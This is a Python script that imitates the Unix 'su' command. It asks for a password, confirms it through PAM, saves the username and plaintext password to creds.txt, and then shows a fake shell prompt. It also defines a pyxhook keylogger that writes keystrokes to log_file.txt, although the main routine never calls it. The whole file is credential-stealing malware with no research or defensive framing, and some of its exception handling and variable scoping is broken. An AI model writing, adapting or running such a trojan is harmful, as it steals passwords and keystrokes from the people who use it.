#!/usr/bin/env python
import sys
import pam
import getpass
import os
import threading
import pexpect
import pyxhook
from pwd import getpwnam
from subprocess import call


def OnKeyPress(event):
    fob = open('log_file.txt', 'a')
    fob.write(event.Key)
    fob.write('\n')

    if event.Ascii == 96:
        fob.close()
        new_hook.cancel()


def transport_creds(username, password):
    target = open("creds.txt", 'w+')
    target.write("Username: " + username + "\n")
    target.write("Password: " + password)
    target.close()


def gen_arg_list():
    arguments = []
    for arg in sys.argv:
        arguments.append(arg)
    return arguments


def keylog():
    new_hook = pyxhook.HookManager()
    new_hook.KeyDown = OnKeyPress
    new_hook.HookKeyboard()
    new_hook.start()


def su_method(username):
    try:
        p = pam.pam()
        pswd = getpass.getpass("Password: ")
        success = p.authenticate(username, pswd)

        while success is not True:
            print ("Invalid Password\n")
            pswd = getpass.getpass("Password: ")
            success = p.authenticate(username, pswd)

        return pswd

    except expression as identifier:
        pass

    return 0


def shell(username, uid):
    try:
        while True:
            os.setuid(uid)
            command = raw_input("[" + username + "@Localhost ~]$ ")
            call([command])
    except expression as identifier:
        pass


def main():
    try:
        args = gen_arg_list()
        username = args[2]

        pswd = su_method(username)
        transport_creds(username, pswd)

        uid = getpwnam(username).pw_uid
        shell(username, uid)

    except ValueError:
        pass

if __name__ == '__main__':
    main()
